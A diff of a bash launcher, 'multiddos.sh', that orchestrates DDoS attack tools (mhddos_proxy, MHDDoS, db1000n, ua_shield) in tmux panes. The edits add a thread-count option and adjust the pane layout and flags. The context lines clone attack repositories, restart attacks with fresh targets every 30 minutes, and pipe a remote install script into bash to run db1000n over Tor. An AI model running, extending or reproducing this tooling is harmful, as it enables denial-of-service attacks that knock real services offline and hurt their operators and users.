@@ -14,12 +14,8 @@ cat > auto_bash.sh << 'EOF'
 cd ~/multiddos/
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
-python3 -m pip install -r ~/multiddos/mhddos_proxy/requirements.txt
+python3 -m pip install -r requirements.txt
 git clone https://github.com/MHProDev/MHDDoS.git
-
-threads="${1:-2000}"; threads="-t $threads"
-rpc="--rpc 2000"
-debug="--debug"
 
 # Restart attacks and update targets every 30 minutes
 while true; do
@@ -51,7 +47,7 @@ tmux source-file ~/.tmux.conf
 
 tmux new-session -s multiddos -d 'gotop -asc solarized'
 sleep 0.2
-tmux split-window -h -p 75 'bash auto_bash.sh'
+tmux split-window -h -p 66 'bash auto_bash.sh'
 sleep 0.2
 if [[ $mode == "-m2" || $mode == "-m3" ]]; then
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
@@ -64,7 +60,7 @@ fi
 sleep 0.2
 tmux select-pane -t 0
 sleep 0.2
-if [[ $matrix == "1" ]]; then
+if [[ $matrix == "on" ]]; then
 sudo apt install cmatrix -qq -y
 tmux split-window -v 'cmatrix'
 fi
@@ -77,6 +73,7 @@ usage: bash multiddos.sh [-m1|-m2|a]
 -m1            (optional)           - mode 1. ddos tool: auto_bash
 -m2            (optional; default)  - mode 2. ddos tools: auto_bash + db1000n
 -m3            (optional)           - mode 3. ddos tools: auto_bash + db1000n + ua_shield
+-t             (optional)           - threads; default = 1000
 --matrix       (optional)           - enter the matrix
 -h | --help    (optional)           - brings up this menu
 EOF
@@ -84,7 +81,10 @@ exit
 }
 
 mode="-m2"
-matrix="0"
+matrix="off"
+threads="-t 1000"
+rpc="--rpc 2000"
+debug="--debug"
 if [[ "$1" = ""  ]]; then launch; fi
 
 while [ "$1" != "" ]; do
@@ -92,7 +92,8 @@ while [ "$1" != "" ]; do
         -m1 )   mode=$1; shift ;;
         -m2 )   mode=$1; shift ;;
         -m3 )   mode=$1; shift ;;
-        --matrix )   matrix="1"; shift ;;
+        -t  )   threads="-t $2"; shift 2;;
+        --matrix )   matrix="on"; shift ;;
         -h | --help )    usage;   exit ;;
     esac
 done
